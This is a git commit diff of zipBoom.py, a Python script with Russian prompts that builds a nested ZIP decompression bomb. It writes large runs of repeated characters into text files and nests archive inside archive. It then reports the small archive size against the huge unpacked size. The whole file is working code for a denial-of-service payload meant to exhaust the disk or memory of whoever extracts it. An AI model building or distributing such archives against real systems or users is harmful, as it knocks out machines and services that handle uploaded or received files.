79fd2d9a060f33308723e595e57a6de879380cd5
OverLeo007 <sokolov_lev2003@mail.ru>
2019-12-30 13:23:22 +0700

    sourcecode

--- zipBoom.py
+++ zipBoom.py
@@ -1,34 +1,74 @@
 import zipfile
 import os
-
-file = open('ban.txt', 'w')
-for i in range(1000):
-    file.write('123' * 100)
-file.close()
-
-jungle_zip = zipfile.ZipFile(f'{0}.zip', 'w')
-jungle_zip.write('ban.txt', compress_type=zipfile.ZIP_DEFLATED)
-jungle_zip.close()
-
-path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'ban.txt')
-os.remove(path)
-
-for i in range(1, 11):
-    jungle_zip = zipfile.ZipFile(f'{i}.zip', 'w')
-    jungle_zip.write(f'{i - 1}.zip', compress_type=zipfile.ZIP_DEFLATED)
-    file = open('ban.txt', 'w')
-
-    for j in range(1000):
-        file.write('123' * 100)
-    file.close()
+import random
+import time
 
 
-    jungle_zip.write('ban.txt', compress_type=zipfile.ZIP_DEFLATED)
-    jungle_zip.close()
 
-    path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'ban.txt')
-    os.remove(path)
+def rfile(dfile):
+    # path = os.path.join(os.path.abspath(os.path.dirname(__file__)), dfile)
+    os.remove(os.getcwd() + f'\\{dfile}')
 
-    jungle_zip.close()
-    path = os.path.join(os.path.abspath(os.path.dirname(__file__)), f'{i - 1}.zip')
-    os.remove(path)
+
+def makelarch(iterations, arhname, fsize=100000):
+    global itera
+    arch = zipfile.ZipFile(arhname, 'w')
+    for i in range(10):
+        file = open(f'{i}.txt', 'w')
+        for j in range(fsize):
+            file.write('1')
+        file.close()
+        global size
+        size += os.path.getsize(f'{i}.txt')
+        arch.write(f'{i}.txt', compress_type=zipfile.ZIP_DEFLATED)
+        rfile(f'{i}.txt')
+    os.system('clear')
+    print(f'{itera + 1}/{iterations ** 2}')
+    itera += 1
+    arch.close()
+
+
+# makelarch(100, 'ban.zip')
+def makemarch(iterations, arhname, fsize=100):
+    archm = zipfile.ZipFile(arhname, 'w')
+    for i in range(iterations):
+        makelarch(iterations, f'{i}.zip', fsize)
+        archm.write(f'{i}.zip', compress_type=zipfile.ZIP_DEFLATED)
+        try:
+            rfile(f'{i - 1}.zip')
+        except Exception:
+            pass
+    archm.close()
+
+
+def makebarch(iterations, arhname, fsize=100):
+    archm = zipfile.ZipFile(arhname, 'w')
+    try:
+        os.mkdir('temp')
+    except FileExistsError:
+        pass
+    cdir = os.getcwd() + '\\temp'
+    os.chdir(cdir)
+    for i in range(iterations):
+        makemarch(iterations, f'{i}.zip', fsize)
+        archm.write(f'{i}.zip', compress_type=zipfile.ZIP_DEFLATED)
+        try:
+            rfile(f'{i - 1}.zip')
+        except Exception:
+            pass
+    archm.close()
+    os.chdir(cdir[:-5])
+
+
+bigr = int(input('Введите количество вложенных архивов (влияет на время выполнения)\n'))
+start_time = time.time()
+itera = 0
+size = 0
+makebarch(bigr, 'driga.zip', 1000000)
+for i in os.listdir(os.getcwd() + '\\temp'):
+    rfile(f'temp\\{i}')
+os.rmdir('temp')
+print("Время выполнения %s секунд" % (time.time() - start_time))
+print(f'Вес распакованных файлов составляет {size} бит')
+print(f'Вес архива: {os.path.getsize("driga.zip")} бита')
+print(input('Нажмите Enter чтобы закрыть окно'))
